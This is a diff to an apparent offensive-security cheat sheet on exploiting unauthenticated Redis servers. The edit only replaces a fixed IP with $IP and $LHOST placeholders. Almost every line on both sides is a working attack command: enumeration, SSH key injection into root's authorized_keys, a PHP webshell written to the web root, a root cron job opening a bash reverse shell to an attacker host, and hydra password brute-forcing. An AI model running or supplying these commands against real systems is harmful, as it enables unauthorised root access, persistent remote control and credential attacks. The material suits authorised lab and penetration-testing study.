@@ -1,15 +1,15 @@
 # Redis (6379)
 
 !!! tip "Start here"
-    Connect without credentials: `redis-cli -h 10.10.10.10`. Run `INFO`, if it responds, you have unauthenticated access. Check if you can write to disk with `CONFIG SET dir` and `CONFIG SET dbfilename`, this is the path to SSH key injection or webshell drops.
+    Connect without credentials: `redis-cli -h $IP`. Run `INFO`, if it responds, you have unauthenticated access. Check if you can write to disk with `CONFIG SET dir` and `CONFIG SET dbfilename`, this is the path to SSH key injection or webshell drops.
 
 ---
 
 ## Enumeration
 
 ```bash
-nmap -p 6379 --script redis-info 10.10.10.10
-redis-cli -h 10.10.10.10
+nmap -p 6379 --script redis-info $IP
+redis-cli -h $IP
 ```
 
 ---
@@ -17,8 +17,8 @@ redis-cli -h 10.10.10.10
 ## Basic Interaction
 
 ```bash
-redis-cli -h 10.10.10.10
-redis-cli -h 10.10.10.10 -a <password>
+redis-cli -h $IP
+redis-cli -h $IP -a <password>
 
 # Once connected:
 INFO                    # server info, OS, config file location
@@ -42,16 +42,16 @@ ssh-keygen -t rsa -f /tmp/redis_key
 
 # Write the public key into Redis
 echo -e "\n\n" >> /tmp/redis_key.pub
-redis-cli -h 10.10.10.10 FLUSHALL
-cat /tmp/redis_key.pub | redis-cli -h 10.10.10.10 -x SET pwn
+redis-cli -h $IP FLUSHALL
+cat /tmp/redis_key.pub | redis-cli -h $IP -x SET pwn
 
 # Set the write path to root's .ssh directory
-redis-cli -h 10.10.10.10 CONFIG SET dir /root/.ssh
-redis-cli -h 10.10.10.10 CONFIG SET dbfilename authorized_keys
-redis-cli -h 10.10.10.10 BGSAVE
+redis-cli -h $IP CONFIG SET dir /root/.ssh
+redis-cli -h $IP CONFIG SET dbfilename authorized_keys
+redis-cli -h $IP BGSAVE
 
 # Connect
-ssh -i /tmp/redis_key root@10.10.10.10
+ssh -i /tmp/redis_key root@$IP
 ```
 
 ---
@@ -61,10 +61,10 @@ ssh -i /tmp/redis_key root@10.10.10.10
 If a web server is running and you can identify the web root from `INFO`:
 
 ```bash
-redis-cli -h 10.10.10.10 CONFIG SET dir /var/www/html
-redis-cli -h 10.10.10.10 CONFIG SET dbfilename shell.php
-redis-cli -h 10.10.10.10 SET payload '<?php system($_GET["cmd"]); ?>'
-redis-cli -h 10.10.10.10 BGSAVE
+redis-cli -h $IP CONFIG SET dir /var/www/html
+redis-cli -h $IP CONFIG SET dbfilename shell.php
+redis-cli -h $IP SET payload '<?php system($_GET["cmd"]); ?>'
+redis-cli -h $IP BGSAVE
 ```
 
 ---
@@ -72,10 +72,10 @@ redis-cli -h 10.10.10.10 BGSAVE
 ## Cron Job for Reverse Shell
 
 ```bash
-redis-cli -h 10.10.10.10 CONFIG SET dir /var/spool/cron/crontabs
-redis-cli -h 10.10.10.10 CONFIG SET dbfilename root
-redis-cli -h 10.10.10.10 SET cron "\n\n* * * * * bash -i >& /dev/tcp/<attacker-ip>/9001 0>&1\n\n"
-redis-cli -h 10.10.10.10 BGSAVE
+redis-cli -h $IP CONFIG SET dir /var/spool/cron/crontabs
+redis-cli -h $IP CONFIG SET dbfilename root
+redis-cli -h $IP SET cron "\n\n* * * * * bash -i >& /dev/tcp/$LHOST/9001 0>&1\n\n"
+redis-cli -h $IP BGSAVE
 ```
 
 ---
@@ -83,7 +83,7 @@ redis-cli -h 10.10.10.10 BGSAVE
 ## Brute Force (if password protected)
 
 ```bash
-hydra -P /usr/share/wordlists/rockyou.txt redis://10.10.10.10
+hydra -P /usr/share/wordlists/rockyou.txt redis://$IP
 ```
 
 !!! tip "Real-world"
